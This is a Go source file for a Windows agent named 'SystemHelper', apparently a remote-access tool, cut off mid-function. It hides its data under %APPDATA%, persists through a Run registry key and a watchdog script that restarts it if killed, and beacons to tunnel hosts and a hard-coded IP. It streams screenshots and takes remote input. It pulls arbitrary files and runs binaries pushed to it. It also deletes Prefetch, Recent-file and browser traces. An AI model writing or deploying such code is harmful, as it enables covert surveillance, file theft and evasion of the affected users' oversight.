package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"image/jpeg"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
	"unsafe"

	"github.com/kbinani/screenshot"
	"github.com/gorilla/websocket"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const Version = "6.0.0"

var agentId string
var isServerMode = false
var isInternalMode = false
var orgName = ""
var fps = 1
var logFile *os.File
var hostname string
var authUser = "puneet"
var authPass = "puneet12"
var authToken = ""

// Activity tracking
var programStartTime = time.Now()
var lastIdleState = "active"
var idlePeriodStart time.Time
var activePeriodStart = time.Now()
var totalIdleSeconds int64
var totalActiveSeconds int64
var currentIdleSeconds int

// Data directory for config/logs (hidden from user)
func dataDir() string {
	exe, _ := os.Executable()
	// On Windows, use %APPDATA%\SystemHelper
	if runtime.GOOS == "windows" {
		appData := os.Getenv("APPDATA")
		if appData != "" {
			d := filepath.Join(appData, "SystemHelper")
			os.MkdirAll(d, 0755)
			return d
		}
	}
	// Fallback: next to .exe
	return filepath.Dir(exe)
}

func loadAuth() {
	cfgFile := filepath.Join(dataDir(), "auth.ini")

	// Try to read from file
	data, err := os.ReadFile(cfgFile)
	if err == nil {
		lines := strings.Split(string(data), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if strings.HasPrefix(line, "username=") {
				authUser = strings.TrimPrefix(line, "username=")
			}
			if strings.HasPrefix(line, "password=") {
				authPass = strings.TrimPrefix(line, "password=")
			}
		}
	} else {
		// Create default config file
		defaultCfg := "username=" + authUser + "\npassword=" + authPass + "\n"
		os.WriteFile(cfgFile, []byte(defaultCfg), 0644)
	}
	authToken = sha256Hex(authUser + ":" + authPass)
}

func sha256Hex(s string) string {
	h := sha256.Sum256([]byte(s))
	return fmt.Sprintf("%x", h)
}

func checkAuth(w http.ResponseWriter, r *http.Request) bool {
	u, p, ok := r.BasicAuth()
	if ok && u == authUser && p == authPass { return true }
	w.Header().Set("WWW-Authenticate", `Basic realm="Remote Monitor"`)
	http.Error(w, "Unauthorized", 401)
	return false
}

var serverUrls = []string{
	"wss://remote-monitor-1l0s.onrender.com",                    // Render.com (primary) ⭐
	"wss://deviation-tweak-charter.ngrok-free.dev",                 // ngrok (backup)
	"ws://127.0.0.1:3000",                                          // local fallback
	"ws://43.247.40.101:3000",                                      // port forwarding (last)
}

var serverNames = map[string]string{
	"render":     "wss://remote-monitor-1l0s.onrender.com",
	"ngrok":      "wss://deviation-tweak-charter.ngrok-free.dev",
	"cloudflare": "wss://warming-theater-photo-pentium.trycloudflare.com",
	"direct":     "ws://43.247.40.101:3000",
}

func loadCustomUrls() {
	// First check next to .exe (for easy distribution)
	exe, _ := os.Executable()
	exeDir := filepath.Dir(exe)
	exeFile := filepath.Join(exeDir, "urls.ini")
	
	// Then check dataDir (for hidden config)
	dataFile := filepath.Join(dataDir(), "urls.ini")
	
	// Try exeDir first, then dataDir
	paths := []string{exeFile, dataFile}
	for _, urlFile := range paths {
		data, err := os.ReadFile(urlFile)
		if err != nil { continue }
		
		lines := strings.Split(string(data), "\n")
		for i := len(lines) - 1; i >= 0; i-- {
			line := strings.TrimSpace(lines[i])
			if line != "" && !strings.HasPrefix(line, "#") {
				serverUrls = append([]string{line}, serverUrls...)
			}
		}
		log("Loaded URLs from: " + urlFile)
		break // Only load from first found file
	}
}

// Agent info for server mode
type AgentInfo struct {
	Ws       *websocket.Conn
	Name     string
	LastFrame string
	Viewers  map[*websocket.Conn]bool
}

func init() {
	hostname, _ = os.Hostname()
	loadAuth()
	loadCustomUrls()
	f, _ := os.OpenFile(filepath.Join(dataDir(), "agent.log"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	logFile = f
	// Clean old received from both old and new locations
	exe, _ := os.Executable()
	os.RemoveAll(filepath.Join(filepath.Dir(exe), "received"))
	os.MkdirAll(receivedDir(), 0755)
	log("Started v" + Version)
}

func log(msg string) {
	if logFile == nil { return }
	logFile.WriteString(time.Now().Format("15:04:05") + " " + msg + "\n")
	logFile.Sync()
}

type Message struct {
	Type    string                 `json:"type"`
	AgentId string                 `json:"agentId,omitempty"`
	Name    string                 `json:"name,omitempty"`
	Org     string                 `json:"org,omitempty"`
	Frame   string                 `json:"frame,omitempty"`
	Display int                    `json:"display,omitempty"`
	Fps     int                    `json:"fps,omitempty"`
	Command string                 `json:"command,omitempty"`
	Params  map[string]string      `json:"params,omitempty"`
	Data    map[string]interface{} `json:"data,omitempty"`
}

const (
	INPUT_MOUSE           = 0
	INPUT_KEYBOARD        = 1
	MOUSEEVENTF_MOVE      = 0x0001
	MOUSEEVENTF_LEFTDOWN  = 0x0002
	MOUSEEVENTF_LEFTUP    = 0x0004
	MOUSEEVENTF_RIGHTDOWN = 0x0008
	MOUSEEVENTF_RIGHTUP   = 0x0010
	MOUSEEVENTF_ABSOLUTE  = 0x8000
	KEYEVENTF_KEYUP       = 0x0002
)

var (
	user32            = windows.NewLazySystemDLL("user32.dll")
	procSendInput     = user32.NewProc("SendInput")
	procGetDC         = user32.NewProc("GetDC")
	procReleaseDC     = user32.NewProc("ReleaseDC")
	procGetLastInputInfo = user32.NewProc("GetLastInputInfo")
	gdi32             = windows.NewLazySystemDLL("gdi32.dll")
	procGetDeviceCaps = gdi32.NewProc("GetDeviceCaps")
	kernel32          = windows.NewLazySystemDLL("kernel32.dll")
	procGetTickCount  = kernel32.NewProc("GetTickCount")
)

func main() {
	runtime.LockOSThread()
	
	// Check for --server flag (manual server mode)
	useMode := ""
	for i := 0; i < len(os.Args); i++ {
		arg := os.Args[i]
		if arg == "--server" || arg == "-s" {
			isServerMode = true
		}
		if arg == "--internal" || arg == "-i" {
			isInternalMode = true
		}
		if arg == "--org" || arg == "-o" {
			if i+1 < len(os.Args) {
				orgName = os.Args[i+1]
			}
		}
		if arg == "--use" || arg == "-u" {
			if i+1 < len(os.Args) {
				useMode = os.Args[i+1]
			}
		}
		if arg == "--help" || arg == "-h" || arg == "/?" {
			fmt.Println("SystemHelper v" + Version)
			fmt.Println("")
			fmt.Println("Usage:")
			fmt.Println("  SystemHelper.exe                  Auto mode (try all)")
			fmt.Println("  SystemHelper.exe --server         Force this PC to be the server")
			fmt.Println("  SystemHelper.exe --org <name>       Set organization name (for multi-org)")
			fmt.Println("  SystemHelper.exe --internal          Internal mode (no cloud, one file)")
			fmt.Println("  SystemHelper.exe --internal --server Internal mode as server")
			fmt.Println("  SystemHelper.exe --setup-internal Create urls.ini for internal mode")
			fmt.Println("  SystemHelper.exe --setup-org <name> Create org folder with config")
			fmt.Println("  SystemHelper.exe --use <name>     Use only specific server:")
			fmt.Println("    Names: render, ngrok, cloudflare, direct, local")
			fmt.Println("")
			fmt.Println("Examples:")
			fmt.Println("  SystemHelper.exe --internal           Run in internal mode (no cloud)")
			fmt.Println("  SystemHelper.exe --internal --server  Internal mode + become server")
			fmt.Println("  SystemHelper.exe --setup-internal     Create urls.ini file")
			fmt.Println("  SystemHelper.exe --setup-org Office1  Create 'Office1' folder")
			fmt.Println("  SystemHelper.exe --use render         Only use Render.com")
			fmt.Println("")
			fmt.Println("Config files (in %APPDATA%\\SystemHelper\\):")
			fmt.Println("  auth.ini   - Change password")
			fmt.Println("  urls.ini   - Custom server URLs")
			fmt.Println("  agent.ini  - Server preference")
			os.Exit(0)
		}
		if arg == "--setup-internal" {
			setupInternalMode()
		}
		if strings.HasPrefix(arg, "--setup-org") {
			orgName := ""
			if strings.Contains(arg, "=") {
				orgName = strings.SplitN(arg, "=", 2)[1]
			} else if i+1 < len(os.Args) {
				orgName = os.Args[i+1]
			}
			if orgName != "" {
				setupOrgMode(orgName)
			}
		}
	}

	// Apply --use filter
	if useMode != "" {
		if url, ok := serverNames[useMode]; ok {
			serverUrls = []string{url}
			log("Manual mode: using " + useMode + " (" + url + ")")
		} else {
			log("Unknown server name: " + useMode + ". Using auto mode.")
		}
	}

	preventDuplicate()
	cleanTempFiles()
	loadAgentId()
	setupAutostart()
	startActivityLogger()
	
	// Check if this PC was remotely designated as fallback server
	preferredServer := loadServerPreference()
	if isServerMode || preferredServer {
		log("Designated as SERVER")
		runServer()
		return
	}

	// Try to become local server (for other agents on same network)
	ln, err := net.Listen("tcp", "0.0.0.0:3000")
	if err == nil {
		ln.Close()
		log("Starting local server mode (background)")
		go runServer() // Start server in background
	} else {
		// Port 3000 taken → find server on network
		log("Port 3000 busy → scanning for server...")
		serverIP := discoverServer()
		if serverIP != "" {
			log("Found server at: " + serverIP)
			serverUrls = append([]string{"ws://" + serverIP + ":3000"}, serverUrls...)
		}
	}

	// ALWAYS connect to cloud server as agent
	log("Agent ID: " + agentId)
	for { connect(); time.Sleep(3 * time.Second) }
}

func loadServerPreference() bool {
	cfgFile := filepath.Join(dataDir(), "agent.ini")
	data, err := os.ReadFile(cfgFile)
	if err != nil { return false }
	for _, line := range strings.Split(string(data), "\n") {
		if strings.TrimSpace(line) == "prefer_server=true" {
			return true
		}
	}
	return false
}

func saveServerPreference(prefer bool) {
	cfgFile := filepath.Join(dataDir(), "agent.ini")
	val := "false"
	if prefer { val = "true" }
	os.WriteFile(cfgFile, []byte("prefer_server="+val+"\n"), 0644)
}

func handleRemoteUpdate(filename, data string) {
	exe, _ := os.Executable()
	dir := filepath.Dir(exe)
	tmpPath := filepath.Join(dir, filename + ".tmp")
	
	// Decode and save
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil { log("Update decode failed: " + err.Error()); return }
	
	err = os.WriteFile(tmpPath, decoded, 0644)
	if err != nil { log("Update write failed: " + err.Error()); return }
	
	log("Update received: " + filename + " (" + fmt.Sprintf("%d bytes", len(decoded)) + ")")
	
	// Replace original and restart
	exePath := filepath.Join(dir, filename)
	os.Rename(tmpPath, exePath)
	
	log("Update applied. Restarting...")
	
	// Start new version and exit this one
	cmd := exec.Command(exePath)
	hideCmd(cmd)
	cmd.Start()
	os.Exit(0)
}

func preventDuplicate() {
	exe, _ := os.Executable()
	dir := filepath.Dir(exe)
	lockFile := filepath.Join(dir, "agent.lock")
	data, _ := os.ReadFile(lockFile)
	var oldPid int
	fmt.Sscanf(string(data), "%d", &oldPid)
	if oldPid > 0 && oldPid != os.Getpid() {
		cmd := exec.Command("taskkill", "/f", "/pid", fmt.Sprintf("%d", oldPid))
		hideCmd(cmd)
		cmd.Run()
		time.Sleep(500 * time.Millisecond)
	}
	os.Remove(lockFile)
	os.Remove(filepath.Join(dir, "agent.log"))
	os.Remove(filepath.Join(dir, "error.log"))
	os.WriteFile(lockFile, []byte(fmt.Sprintf("%d", os.Getpid())), 0644)
}

func loadAgentId() {
	cfgFile := filepath.Join(dataDir(), "agent.id")
	data, _ := os.ReadFile(cfgFile)
	if len(data) > 0 { agentId = string(data); return }
	agentId = hostname + "-" + fmt.Sprintf("%x", time.Now().UnixNano())[:8]
	os.WriteFile(cfgFile, []byte(agentId), 0644)
}

func setupAutostart() {
	if runtime.GOOS != "windows" { return }
	exe, _ := os.Executable()
	dir := filepath.Dir(exe)
	
	// Create watchdog batch file that auto-restarts if killed
	watchdogPath := filepath.Join(dir, "watchdog.bat")
	watchdog := `@echo off
:loop
tasklist | find "SystemHelper" >nul
if errorlevel 1 start "" "` + exe + `"
timeout /t 120 /nobreak >nul
goto loop`
	os.WriteFile(watchdogPath, []byte(watchdog), 0644)
	
	// Set registry to run watchdog instead of direct exe
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil { log("Registry: " + err.Error()); return }
	defer k.Close()
	k.SetStringValue("SystemMonitor", watchdogPath)
	log("Watchdog installed (auto-restarts every 2 min)")
}

func setupInternalMode() {
	exe, _ := os.Executable()
	dir := filepath.Dir(exe)
	urlsPath := filepath.Join(dir, "urls.ini")
	os.WriteFile(urlsPath, []byte("auto-local\n"), 0644)
	
	fmt.Println("✅ Internal mode configured!")
	fmt.Println("   Created: " + urlsPath)
	fmt.Println("")
	fmt.Println("   To start as SERVER on this PC:")
	fmt.Println("     SystemHelper.exe --server")
	fmt.Println("")
	fmt.Println("   Other PCs: copy urls.ini next to SystemHelper.exe")
	fmt.Println("   They will auto-discover the server on the network.")
	fmt.Println("")
	os.Exit(0)
}

func setupOrgMode(name string) {
	exe, _ := os.Executable()
	orgDir := filepath.Join(filepath.Dir(exe), name)
	os.MkdirAll(orgDir, 0755)
	
	// Copy .exe to org folder
	src, _ := os.ReadFile(exe)
	os.WriteFile(filepath.Join(orgDir, "SystemHelper.exe"), src, 0755)
	
	// Create urls.ini
	os.WriteFile(filepath.Join(orgDir, "urls.ini"), []byte("auto-local\n# org="+name+"\n"), 0644)
	
	// Create README
	readme := "INTERNAL SERVER - " + name + "\n" +
		"========================\n\n" +
		"Organization: " + name + "\n\n" +
		"SERVER SETUP:\n" +
		"  1. Copy this folder to the server PC\n" +
		"  2. Run: SystemHelper.exe --server\n" +
		"  3. Dashboard: http://[SERVER-IP]:3000\n\n" +
		"AGENT SETUP:\n" +
		"  1. Copy this folder to each agent PC\n" +
		"  2. Double-click SystemHelper.exe\n" +
		"  3. Agents auto-connect to the server\n\n" +
		"All PCs must be on the same network.\n"
	os.WriteFile(filepath.Join(orgDir, "README.txt"), []byte(readme), 0644)
	
	fmt.Println("✅ Organization '" + name + "' setup complete!")
	fmt.Println("   Folder: " + orgDir)
	fmt.Println("")
	fmt.Println("   Files created:")
	fmt.Println("     " + name + "\\SystemHelper.exe")
	fmt.Println("     " + name + "\\urls.ini")
	fmt.Println("     " + name + "\\README.txt")
	fmt.Println("")
	fmt.Println("   Copy this folder to all PCs in the organization.")
	os.Exit(0)
}

func cleanupLogs() {
	log("Cleaning logs...")
	dir := dataDir()
	
	// Delete activity logs older than 30 days
	filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil { return nil }
		if !info.IsDir() && strings.HasPrefix(info.Name(), "activity-") {
			if time.Since(info.ModTime()).Hours() > 24*30 { // 30 days
				os.Remove(path)
				log("Removed old log: " + info.Name())
			}
		}
		return nil
	})
	
	// Clear agent.log
	os.Truncate(filepath.Join(dir, "agent.log"), 0)
	
	// Clear error.log
	os.Truncate(filepath.Join(dir, "error.log"), 0)
	
	// Send status to server
	if wsRef != nil {
		wsRef.WriteJSON(Message{Type: "agent-log", Frame: "Logs cleaned"})
	}
	log("Logs cleaned")
}

var wsRef *websocket.Conn // Reference to primary WebSocket for agent responses
var localCancel context.CancelFunc // Cancel previous secondary goroutine on reconnect

func bootTime() time.Time {
	t, _, _ := procGetTickCount.Call()
	return time.Now().Add(-time.Duration(t) * time.Millisecond)
}

func startActivityLogger() {
	if runtime.GOOS != "windows" { return }
	
	bt := bootTime()
	logEventDate("STARTED (boot: " + bt.Format("15:04") + ")")
	
	go func() {
		lastIdle := 0
		lastLog := 0
		statusTick := 0
		for {
			idle := getIdleSeconds()
			now := time.Now()
			
			// Track active/idle periods with accumulation
			if idle > 300 && lastIdle < 300 {
				// Transition: active -> idle
				idlePeriodStart = now
				activeDuration := now.Sub(activePeriodStart).Seconds()
				totalActiveSeconds += int64(activeDuration)
				logEventDate("INACTIVE (idle " + fmt.Sprintf("%ds", idle) + ", active was " + fmt.Sprintf("%.0fs", activeDuration) + ")")
				lastIdleState = "idle"
			}
			if idle < 300 && lastIdle >= 300 {
				// Transition: idle -> active
				activePeriodStart = now
				idleDuration := now.Sub(idlePeriodStart).Seconds()
				totalIdleSeconds += int64(idleDuration)
				logEventDate("ACTIVE (resumed after " + fmt.Sprintf("%.0fs", idleDuration) + ")")
				lastIdleState = "active"
			}
			lastIdle = idle
			currentIdleSeconds = idle
			
			// Log uptime every 60 iterations (60 min)
			lastLog++
			if lastLog >= 60 {
				lastLog = 0
				totalActive := totalActiveSeconds
				totalIdle := totalIdleSeconds
				if idle < 300 {
					totalActive += int64(now.Sub(activePeriodStart).Seconds())
				} else {
					totalIdle += int64(now.Sub(idlePeriodStart).Seconds())
				}
				logEventDate(fmt.Sprintf("RUNNING (uptime %dmin, active %ds, idle %ds)", osUptime(), totalActive, totalIdle))
			}
			
			// Send status to server every 5 min
			statusTick++
			if statusTick >= 5 && wsRef != nil {
				statusTick = 0
				totalActive := totalActiveSeconds
				totalIdle := totalIdleSeconds
				if idle < 300 {
					totalActive += int64(now.Sub(activePeriodStart).Seconds())
				} else {
					totalIdle += int64(now.Sub(idlePeriodStart).Seconds())
				}
				wsRef.WriteJSON(Message{
					Type: "agent-status",
					Data: map[string]interface{}{
						"bootTime":     bootTime().Format(time.RFC3339),
						"programStart": programStartTime.Format(time.RFC3339),
						"totalIdle":    totalIdle,
						"totalActive":  totalActive,
						"currentState": lastIdleState,
						"currentIdle":  idle,
						"uptime":       osUptime(),
						"version":      Version,
					},
				})
			}
			
			time.Sleep(60 * time.Second)
		}
	}()
}

func logEventDate(msg string) {
	path := filepath.Join(dataDir(), "activity-"+time.Now().Format("2006-01-02")+".log")
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil { return }
	defer f.Close()
	f.WriteString(time.Now().Format("2006-01-02 15:04:05") + " " + msg + "\n")
}

func logEvent(path, msg string) {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil { return }
	defer f.Close()
	f.WriteString(time.Now().Format("01-02 15:04") + " " + msg + "\n")
}


func cleanTempFiles() {
	if runtime.GOOS != "windows" { return }
	
	cmds := []string{
		// Clean Windows temp
		`del /f /s /q "%TEMP%\*" >nul 2>&1`,
		`del /f /s /q "C:\Windows\Temp\*" >nul 2>&1`,
		// Clean recent files
		`del /f /s /q "%USERPROFILE%\Recent\*" >nul 2>&1`,
		// Clean prefetch
		`del /f /s /q "C:\Windows\Prefetch\*" >nul 2>&1`,
		// Clean DNS cache
		`ipconfig /flushdns >nul 2>&1`,
		// Clean IE/Edge cache
		`RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8 >nul 2>&1`,
		// Run Disk Cleanup (basic)
		`cleanmgr /sagerun:1 >nul 2>&1`,
	}
	
	for _, c := range cmds {
		cmd := exec.Command("cmd", "/c", c)
		hideCmd(cmd)
		cmd.Run()
	}
	
	log("Temp files cleaned")
}

func receivedDir() string {
	return filepath.Join("C:\\", "ProgramData", "SystemHelper", "received")
}

func cleanOldReceived() {
	dir := receivedDir()
	os.MkdirAll(dir, 0755)
	entries, _ := os.ReadDir(dir)
	for _, e := range entries {
		path := filepath.Join(dir, e.Name())
		os.RemoveAll(path)
	}
}

func handleFileTransfer(filename, data string) {
	dir := receivedDir()
	os.MkdirAll(dir, 0755)
	dest := filepath.Join(dir, filename)
	
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil { log("File transfer decode failed: " + err.Error()); return }
	
	err = os.WriteFile(dest, decoded, 0644)
	if err != nil { log("File transfer write failed: " + err.Error()); return }
	
	log("File received: " + filename + " (" + fmt.Sprintf("%d bytes", len(decoded)) + ") saved to " + dest)
}

func handleFileRequest(path string, conn *websocket.Conn) {
	data, err := os.ReadFile(path)
	if err != nil {
		log("File request failed: " + err.Error())
		conn.WriteJSON(Message{Type: "file-response", Command: path, Frame: "error: " + err.Error()})
		return
	}
	encoded := base64.StdEncoding.EncodeToString(data)
	conn.WriteJSON(Message{Type: "file-response", Command: path, Frame: encoded})
	log("File sent: " + path + " (" + fmt.Sprintf("%d bytes", len(data)) + ")")
}

func startTunnel(ws *websocket.Conn) {
	tunnelMode := "auto"
	if data, err := os.ReadFile(filepath.Join(dataDir(), "tunnel.ini")); err == nil {
		tunnelMode = strings.TrimSpace(string(data))
	}
	log("Tunnel mode: " + tunnelMode)
	
	go func() {
		var url string
		
		// Try localhost.run (SSH, no install needed)
		if tunnelMode == "auto" || tunnelMode == "localhost.run" {
			log("Trying localhost.run...")
			cmd := exec.Command("ssh", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
				"-o", "ConnectTimeout=10",
				"-R", "80:localhost:3000", "localhost.run")
			hideCmd(cmd)
			out, _ := cmd.CombinedOutput()
			output := string(out)
			for _, line := range strings.Split(output, "\n") {
				if strings.Contains(line, "https") && strings.Contains(line, "localhost.run") {
					url = strings.TrimSpace(line)
					break
				}
			}
		}
		
		// Try bore.pub if localhost.run failed
		if url == "" && (tunnelMode == "auto" || tunnelMode == "bore") {
			log("Trying bore.pub...")
			borePath := filepath.Join(dataDir(), "bore.exe")
			if _, err := os.Stat(borePath); os.IsNotExist(err) {
				log("Downloading bore...")
				dl := exec.Command("powershell", "-Command",
					"Invoke-WebRequest -Uri 'https://github.com/ekzhang/bore/releases/download/v0.5.2/bore-v0.5.2-x86_64-pc-windows-msvc.zip' -OutFile '"+
					filepath.Join(dataDir(), "bore.zip")+"' ; Expand-Archive '"+filepath.Join(dataDir(), "bore.zip")+"' -DestinationPath '"+
					dataDir()+"' -Force ; Remove-Item '"+filepath.Join(dataDir(), "bore.zip")+"'")
				hideCmd(dl)
				dl.Run()
			}
			if _, err := os.Stat(borePath); err == nil {
				// bore is non-blocking, runs in background
				cmd := exec.Command(borePath, "local", "3000", "--to", "bore.pub")
				hideCmd(cmd)
				stdout, _ := cmd.StdoutPipe()
				cmd.Start()
				
				// Read first line of output for URL
				buf := make([]byte, 256)
				n, _ := stdout.Read(buf)
				url = strings.TrimSpace(string(buf[:n]))
				if url != "" && !strings.HasPrefix(url, "http") {
					url = "http://bore.pub:" + strings.TrimSpace(strings.Split(url, " ")[0])
				}
			}
		}
		
		if url != "" {
			log("Tunnel URL: " + url)
			os.WriteFile(filepath.Join(dataDir(), "tunnel.url"), []byte(url), 0644)
			if ws != nil { ws.WriteJSON(Message{Type: "tunnel-status", Command: url, Frame: "ready"}) }
		} else {
			log("All tunnels failed")
			if ws != nil { ws.WriteJSON(Message{Type: "tunnel-status", Command: "failed", Frame: "All tunnels failed"}) }
		}
	}()
}

func getIdleSeconds() int {
	type LASTINPUTINFO struct {
		CbSize uint32
		DwTime uint32
	}
	var info LASTINPUTINFO
	info.CbSize = uint32(unsafe.Sizeof(info))
	ret, _, _ := procGetLastInputInfo.Call(uintptr(unsafe.Pointer(&info)))
	if ret == 0 { return 0 }
	tick, _, _ := procGetTickCount.Call()
	diff := uint32(tick) - info.DwTime
	return int(diff / 1000)
}

func osUptime() int {
	t, _, _ := procGetTickCount.Call()
	return int(t / 60000)
}

// ============ SERVER MODE ============
func runServer() {
	log("SERVER MODE on port 3000")
	setupAutostart()
	startActivityLogger()
	agents := make(map[string]*AgentInfo)

	// Generate auth token from credentials
	authToken := sha256Hex(authUser + ":" + authPass)

	http.HandleFunc("/api/agents", func(w http.ResponseWriter, r *http.Request) {
		if !checkAuth(w, r) { return }
		w.Header().Set("Access-Control-Allow-Origin", "*")
		list := []map[string]interface{}{}
		for id, a := range agents {
			list = append(list, map[string]interface{}{"id": id, "name": a.Name})
		}
		json.NewEncoder(w).Encode(list)
	})

	upgrader := websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
	http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
		t := r.URL.Query().Get("token")
		if t == "" || t != authToken {
			if !checkAuth(w, r) { return }
		}
		conn, _ := upgrader.Upgrade(w, r, nil)
		if conn == nil { return }
		defer conn.Close()

		var role, agentIdPtr string
		for {
			_, msg, err := conn.ReadMessage()
			if err != nil { break }
			var d Message
			json.Unmarshal(msg, &d)

			switch d.Type {
			case "agent-hello":
				role = "agent"
				agentIdPtr = d.AgentId
				agents[d.AgentId] = &AgentInfo{Ws: conn, Name: d.Name, Viewers: make(map[*websocket.Conn]bool)}
				log("Agent: " + d.Name)
			case "agent-frame":
				if a, ok := agents[d.AgentId]; ok {
					if d.Display == 0 { a.LastFrame = d.Frame }
					for v := range a.Viewers { v.WriteJSON(Message{Type: "frame", AgentId: d.AgentId, Frame: d.Frame, Display: d.Display}) }
				}
			case "dashboard-hello":
				role = "dashboard"
				list := []map[string]interface{}{}
				for id, a := range agents { list = append(list, map[string]interface{}{"id": id, "name": a.Name}) }
				conn.WriteJSON(map[string]interface{}{"type": "agent-list", "agents": list})
			case "view-agent":
				if a, ok := agents[d.AgentId]; ok {
					a.Viewers[conn] = true
					if a.LastFrame != "" { conn.WriteJSON(Message{Type: "frame", AgentId: d.AgentId, Frame: a.LastFrame}) }
				}
			case "stop-viewing":
				for _, a := range agents { delete(a.Viewers, conn) }
			case "control":
				if a, ok := agents[d.AgentId]; ok { a.Ws.WriteJSON(Message{Type: "control", Command: d.Command, Params: d.Params}) }
			case "set-server-preference":
				if a, ok := agents[d.AgentId]; ok {
					a.Ws.WriteJSON(Message{Type: "set-server-preference", Command: d.Command})
					log("Set server pref for " + d.AgentId + " = " + d.Command)
				}
			case "become-server":
				if a, ok := agents[d.AgentId]; ok {
					a.Ws.WriteJSON(Message{Type: "become-server"})
					log("Forwarded become-server to " + d.AgentId)
				}
			case "file-transfer":
				if a, ok := agents[d.AgentId]; ok {
					a.Ws.WriteJSON(Message{Type: "file-transfer", Command: d.Command, Frame: d.Frame})
					log("Forwarded file-transfer to " + d.AgentId)
				}
			case "request-file":
				if a, ok := agents[d.AgentId]; ok {
					a.Ws.WriteJSON(Message{Type: "request-file", Command: d.Command})
					log("Forwarded request-file to " + d.AgentId)
				}
			}
		}
		if role == "agent" && agentIdPtr != "" { delete(agents, agentIdPtr); log("Agent gone: " + agentIdPtr) }
	})

	// Start embedded agent for this PC
	go func() {
		time.Sleep(1 * time.Second)
		c, _, err := websocket.DefaultDialer.Dial("ws://127.0.0.1:3000/ws?token="+authToken, nil)
		if err != nil { log("Embedded agent failed: " + err.Error()); return }
		c.WriteJSON(Message{Type: "agent-hello", AgentId: agentId, Name: hostname + " (server)", Org: orgName, Data: map[string]interface{}{"agentIP": getLocalIP()}})
		go func() {
			for {
				_, m, e := c.ReadMessage()
		if e != nil { log("Disconnected: " + e.Error()); return }
				var msg Message
				json.Unmarshal(m, &msg)
				if msg.Type == "control" { executeControl(msg.Command, msg.Params) }
			}
		}()
		for {
			for _, m := range captureFrames() {
				m.Type = "agent-frame"
				m.AgentId = agentId
				c.WriteJSON(m)
			}
			time.Sleep(time.Second)
		}
	}()

	// Serve dashboard page with auth token embedded
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if !checkAuth(w, r) { return }
		w.Header().Set("Access-Control-Allow-Origin", "*")
		if r.URL.Path == "/" {
			html := strings.Replace(htmlDashboard, "TOKEN_PLACEHOLDER", authToken, 1)
			w.Write([]byte(html))
		}
	})

	log("Listening on :3000")
	http.ListenAndServe(":3000", nil)
}

// Discover server on local network by scanning subnet for port 3000
func discoverServer() string {
	// Get local IP to determine subnet
	localIP := getLocalIP()
	if localIP == "" { return "" }
	
	parts := strings.Split(localIP, ".")
	if len(parts) != 4 { return "" }
	subnet := parts[0] + "." + parts[1] + "." + parts[2] + "."
	myLast, _ := strconv.Atoi(parts[3])

	// Scan hosts 1-254 in parallel
	result := make(chan string, 254)
	for i := 1; i <= 254; i++ {
		if i == myLast { continue } // skip self
		go func(host int) {
			ip := subnet + strconv.Itoa(host)
			conn, err := net.DialTimeout("tcp", ip+":3000", 500*time.Millisecond)
			if err == nil {
				conn.Close()
				result <- ip
			} else {
				result <- ""
			}
		}(i)
	}

	// Wait for results
	timeout := time.After(3 * time.Second)
	found := ""
	for i := 1; i <= 253; i++ {
		select {
		case ip := <-result:
			if ip != "" {
				found = ip
				// Don't return immediately - wait for all to finish
			}
		case <-timeout:
			return found
		}
	}
	return found
}

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil { return "" }
	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ip := ipnet.IP.To4(); ip != nil {
				return ip.String()
			}
		}
	}
	return ""
}
func connect() {
	// Reload URLs from config (so remote switch-server takes effect)
	loadCustomUrls()
	
	// Check if internal-only mode
	isInternal := isInternalMode
	if !isInternal {
		for _, url := range serverUrls {
			if url == "auto-local" {
				isInternal = true
				break
			}
		}
	}
	
	if isInternal {
		log("INTERNAL MODE: Cloud disabled, local network only")
		// Don't try cloud URLs, just discover local server
		serverIP := discoverServer()
		if serverIP != "" {
			log("Found server at: " + serverIP)
			serverUrls = []string{"ws://" + serverIP + ":3000"}
		} else {
			log("No server found on network. Will retry.")
			time.Sleep(10 * time.Second)
			return
		}
	}
	
	log("URLs to try: " + fmt.Sprintf("%v", serverUrls))
	
	// Connect to primary server (first working URL)
	var c *websocket.Conn
	for _, url := range serverUrls {
		log("Trying: " + url)
		var err error
		authURL := url + "/ws?token=" + authToken
		c, _, err = websocket.DefaultDialer.Dial(authURL, nil)
		if err == nil { log("Connected: " + url); break }
	}
	if c == nil { log("Disconnected: all URLs failed"); return }
	defer c.Close()
	wsRef = c // Save reference for agent responses
	localIP := getLocalIP()
	c.WriteJSON(Message{Type: "agent-hello", AgentId: agentId, Name: hostname, Org: orgName, Data: map[string]interface{}{
		"bootTime":     bootTime().Format(time.RFC3339),
		"programStart": programStartTime.Format(time.RFC3339),
		"version":      Version,
		"agentIP":      localIP,
	}})

	// Also connect to local server as secondary (for speed)
	if localCancel != nil { localCancel() }
	var lctx context.Context
	lctx, localCancel = context.WithCancel(context.Background())
	go func() {
		localURL := "ws://127.0.0.1:3000/ws?token=" + authToken
		c2, _, err2 := websocket.DefaultDialer.Dial(localURL, nil)
		if err2 != nil { return } // Local server not available
		defer c2.Close()
		c2.WriteJSON(Message{Type: "agent-hello", AgentId: agentId, Name: hostname + " (local)", Org: orgName, Data: map[string]interface{}{"agentIP": localIP}})
		log("Connected to local server (secondary)")
		
